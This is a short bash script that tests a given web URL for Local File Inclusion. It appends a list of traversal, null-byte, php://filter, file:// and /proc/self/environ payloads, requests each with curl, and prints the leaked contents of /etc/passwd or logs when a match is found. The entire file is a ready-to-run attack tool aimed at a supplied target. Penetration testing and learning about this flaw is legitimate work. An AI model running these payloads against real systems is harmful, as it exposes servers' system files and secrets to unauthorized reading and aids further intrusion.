#!/bin/bash
# lfi_test.sh - Local File Inclusion testing
# Usage: ./lfi_test.sh URL

source "$(dirname "$0")/config.sh" 2>/dev/null || true

if [ -z "$1" ]; then
    echo "Usage: $0 URL"
    echo "Example: $0 'http://target.com/page.php?file='"
    exit 1
fi

URL="$1"

echo "[*] LFI testing on $URL"

PAYLOADS=(
    "/etc/passwd"
    "../../../../../../etc/passwd"
    "....//....//....//....//etc/passwd"
    "/etc/passwd%00"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "file:///etc/passwd"
    "/proc/self/environ"
    "/var/log/apache2/access.log"
)

for payload in "${PAYLOADS[@]}"; do
    FULL_URL="${URL}${payload}"
    RESPONSE=$(curl -s "$FULL_URL")
    
    if echo "$RESPONSE" | grep -qE "root:|daemon:|www-data:"; then
        echo "[+] VULNERABLE: $payload"
        echo "[+] Content preview:"
        echo "$RESPONSE" | head -5
        break
    else
        echo "[-] Not vulnerable: $payload"
    fi
done
